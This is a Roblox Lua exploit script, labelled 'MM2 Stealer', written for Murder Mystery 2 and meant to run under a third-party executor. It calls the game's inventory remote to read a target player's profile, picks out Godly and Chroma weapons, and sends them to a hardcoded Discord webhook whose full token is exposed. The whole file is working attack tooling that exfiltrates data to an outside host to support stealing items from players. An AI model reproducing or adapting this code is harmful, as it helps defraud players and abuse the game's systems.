local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local plr = Players.LocalPlayer

getgenv().user = "MM2danya7"
local webhook = "https://discord.com/api/webhooks/1415660439702081587/f-WR6U-AmmoTFBPnxXlBqWKaelol6TsPDDMmmGSh0yKjUi6gzefqilg1se3M3mtl1AjS"

-- Улучшенная функция отправки вебхука
local function SendWebhookRequest(embedData)
    local data = {
        ["embeds"] = {embedData}
    }

    local success, response = pcall(function()
        local body = HttpService:JSONEncode(data)
        
        -- Проверяем доступные методы отправки
        if syn and syn.request then
            return syn.request({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = body
            })
        elseif request then
            return request({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = body
            })
        else
            -- Используем HttpService для Roblox
            return HttpService:PostAsync(webhook, body)
        end
    end)
    
    return success, response
end

-- Проверяем существование Remote функций
if not ReplicatedStorage:FindFirstChild("Remotes") then
    warn("Не найдена папка Remotes!")
    return
end

local Remotes = ReplicatedStorage.Remotes
if not Remotes:FindFirstChild("Inventory") then
    warn("Не найдена папка Inventory!")
    return
end

local Inventory = Remotes.Inventory

-- Проверяем существование функций
if not Inventory:FindFirstChild("GetProfileData") then
    warn("Не найдена функция GetProfileData!")
    return
end

print("Начинаем получение данных...")

-- Получаем данные профиля
local targetPlayer = Players:FindFirstChild(user)
if targetPlayer then
    print("Найден игрок:", targetPlayer.Name)
    
    local success, profileData = pcall(function()
        return Inventory.GetProfileData:InvokeServer(targetPlayer)
    end)
    
    if success and profileData then
        print("Данные профиля получены успешно")
        
        -- Для теста выведем структуру данных
        print("Количество оружия:", #profileData.Weapons.Owned)
        
        -- Таблицы для фильтрации предметов
        local rarityTable = {"Common", "Uncommon", "Rare", "Epic", "Legendary", "Godly", "Chroma"}
        local min_rarityindex = 5
        
        -- Временная база для теста
        local database = {
            ["RedLuger"] = {ItemName = "RedLuger", Rarity = "Godly"},
            ["Chroma Luger"] = {ItemName = "Chroma Luger", Rarity = "Chroma"},
            -- добавьте другие предметы
        }
        
        local send_wpn = {}
        
        -- Пробуем разные варианты структуры данных
        if profileData.Weapons and profileData.Weapons.Owned then
            for itemName, amount in pairs(profileData.Weapons.Owned) do
                print("Предмет:", itemName, "Количество:", amount)
                
                local itemInfo = database[itemName]
                if itemInfo then
                    local rarityIndex = table.find(rarityTable, itemInfo.Rarity)
                    if rarityIndex and rarityIndex >= min_rarityindex then
                        table.insert(send_wpn, {
                            DataID = itemInfo.ItemName,
                            Rarity = itemInfo.Rarity,
                            Amount = amount
                        })
                    end
                end
            end
        end

        print("Найдено предметов для отправки:", #send_wpn)
        
        if #send_wpn > 0 then
            local function formatItems(items)
                local str = ""
                for _, item in ipairs(items) do
                    str = str .. string.format("%s (x%s) - %s\n", item.DataID, item.Amount, item.Rarity)
                end
                return str
            end

            local embedData = {
                ["title"] = "MM2 Stealer",
                ["color"] = 0x0663EE,
                ["fields"] = {
                    {name = "Username", value = targetPlayer.Name, inline = true},
                    {name = "Items", value = formatItems(send_wpn), inline = false}
                },
                ["footer"] = {["text"] = "mm2 by vexadez"}
            }

            local success, response = SendWebhookRequest(embedData)
            if success then
                print("Webhook отправлен успешно!")
            else
                warn("Ошибка отправки webhook:", response)
            end
        else
            print("Нет предметов для отправки")
        end
    else
        warn("Не удалось получить данные профиля:", profileData)
    end
else
    print("Игрок", user, "не найден")
end
